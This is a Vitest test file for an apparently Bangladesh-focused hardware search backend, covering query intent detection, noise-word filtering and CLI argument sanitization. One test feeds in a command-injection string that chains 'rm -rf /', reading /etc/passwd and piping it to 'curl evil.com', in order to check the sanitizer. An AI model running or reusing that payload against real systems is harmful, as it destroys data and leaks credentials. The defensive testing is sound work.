import { describe, it, expect, afterAll } from 'vitest';
import { detectSearchIntent, getQueryVariations, sanitizeCliArg, sanitizeLog } from '../../server.js';
import { captureEvidence, closeBrowser } from '../helpers/visualEvidence.js';

describe('Backend > Search Intent, Model Gating & Token Normalization (server.js)', () => {
  afterAll(async () => {
    await closeBrowser();
  });

  it('BE-SEARCH-INTENT-001: GPU Model Code Gating (e.g. RTX 4060 vs 3060/4070)', async () => {
    const gpuIntent = detectSearchIntent('RTX 4060 8GB graphics card');

    expect(gpuIntent.category).toBe('Graphics Card');
    expect(gpuIntent.type).toBe('gpu');
    expect(gpuIntent.modelCode).toBe('4060');
    expect(gpuIntent.excludes).toContain('laptop');
    expect(gpuIntent.excludes).toContain('desktop pc');

    await captureEvidence({
      testId: 'BE-SEARCH-INTENT-001',
      service: 'backend',
      moduleName: 'Search Intent & GPU Model Gating',
      description: 'Detects GPU intent, extracts model code 4060, and adds negative exclusions for laptops/PCs',
      steps: 'detectSearchIntent("RTX 4060 8GB graphics card")',
      expected: 'Category: Graphics Card, ModelCode: 4060, Excludes: [laptop, desktop pc, ...]',
      actual: `Category: ${gpuIntent.category}, ModelCode: ${gpuIntent.modelCode}, Excludes count: ${gpuIntent.excludes.length}`,
      status: 'PASS',
      inputData: 'RTX 4060 8GB graphics card',
      outputData: gpuIntent
    });
  });

  it('BE-SEARCH-INTENT-002: CPU Intent & Socket/Series Isolation', async () => {
    const cpuIntent = detectSearchIntent('Ryzen 7 7700 processor price in bd');

    expect(cpuIntent.category).toBe('Processor');
    expect(cpuIntent.type).toBe('cpu');
    expect(cpuIntent.modelCode).toContain('7700');
    expect(cpuIntent.excludes).toContain('laptop');

    await captureEvidence({
      testId: 'BE-SEARCH-INTENT-002',
      service: 'backend',
      moduleName: 'Search Intent & CPU Isolation',
      description: 'Detects CPU intent and extracts Ryzen 7700 model code',
      steps: 'detectSearchIntent("Ryzen 7 7700 processor price in bd")',
      expected: 'Category: Processor, ModelCode containing: 7700',
      actual: `Category: ${cpuIntent.category}, ModelCode: ${cpuIntent.modelCode}`,
      status: 'PASS',
      inputData: 'Ryzen 7 7700 processor price in bd',
      outputData: cpuIntent
    });
  });

  it('BE-SEARCH-INTENT-003: Motherboard, RAM, SSD and Casing Intent Detection', async () => {
    const mbIntent = detectSearchIntent('MSI B650 motherboard');
    const ssdIntent = detectSearchIntent('Samsung 990 Pro 1TB SSD');
    const ramIntent = detectSearchIntent('Corsair DDR5 RAM');

    expect(mbIntent.category).toBe('Motherboard');
    expect(mbIntent.modelCode.toUpperCase()).toBe('B650');
    expect(ssdIntent.category).toBe('SSD Storage');
    expect(ramIntent.category).toBe('RAM Memory');

    await captureEvidence({
      testId: 'BE-SEARCH-INTENT-003',
      service: 'backend',
      moduleName: 'Multi-Category Hardware Intent Parser',
      description: 'Verifies Motherboard, SSD, and RAM intent classification',
      steps: 'detectSearchIntent() across MB, SSD, RAM queries',
      expected: 'Accurate category classification and model isolation',
      actual: `MB: ${mbIntent.category} (${mbIntent.modelCode}), SSD: ${ssdIntent.category}, RAM: ${ramIntent.category}`,
      status: 'PASS',
      inputData: ['MSI B650 motherboard', 'Samsung 990 Pro 1TB SSD', 'Corsair DDR5 RAM'],
      outputData: { mbIntent, ssdIntent, ramIntent }
    });
  });

  it('BE-SEARCH-INTENT-004: Query Variations & Noise Word Filtering', async () => {
    const { cleanQ, normQ, tokens } = getQueryVariations('StarTech best cheap ryzen 7 7700 32 gb ram price in bangladesh');

    expect(tokens).not.toContain('cheap');
    expect(tokens).not.toContain('price');
    expect(tokens).not.toContain('bangladesh');
    expect(tokens).toContain('7700');
    expect(normQ).toContain('32gb');

    await captureEvidence({
      testId: 'BE-SEARCH-INTENT-004',
      service: 'backend',
      moduleName: 'Query Variation & Noise Stripper',
      description: 'Strips noise keywords (cheap, price, bd) and normalizes unit variations (32 gb -> 32gb)',
      steps: 'getQueryVariations("StarTech best cheap ryzen 7 7700 32 gb ram price in bangladesh")',
      expected: 'Noise words removed, tokens contain clean hardware identifiers',
      actual: `Tokens: [${tokens.join(', ')}], NormQ: "${normQ}"`,
      status: 'PASS',
      inputData: 'StarTech best cheap ryzen 7 7700 32 gb ram price in bangladesh',
      outputData: { cleanQ, normQ, tokens }
    });
  });

  it('BE-SEARCH-INTENT-005: CLI Argument Sanitization & Injection Prevention', async () => {
    const maliciousInput = 'RTX 4060; rm -rf / && cat /etc/passwd | curl evil.com';
    const sanitized = sanitizeCliArg(maliciousInput);

    expect(sanitized).not.toContain(';');
    expect(sanitized).not.toContain('&');
    expect(sanitized).not.toContain('|');
    expect(sanitized).not.toContain('/');
    expect(sanitized).toBe('RTX 4060 rm -rf cat etc passwd curl evil.com');

    await captureEvidence({
      testId: 'BE-SEARCH-INTENT-005',
      service: 'backend',
      moduleName: 'CLI Argument Injection Guard',
      description: 'Strictly strips shell metacharacters to prevent command injection in Python child process',
      steps: `sanitizeCliArg("${maliciousInput}")`,
      expected: 'All shell metacharacters (; & | / ` $) stripped',
      actual: `Sanitized string: "${sanitized}"`,
      status: 'PASS',
      inputData: maliciousInput,
      outputData: { sanitized }
    });
  });
});
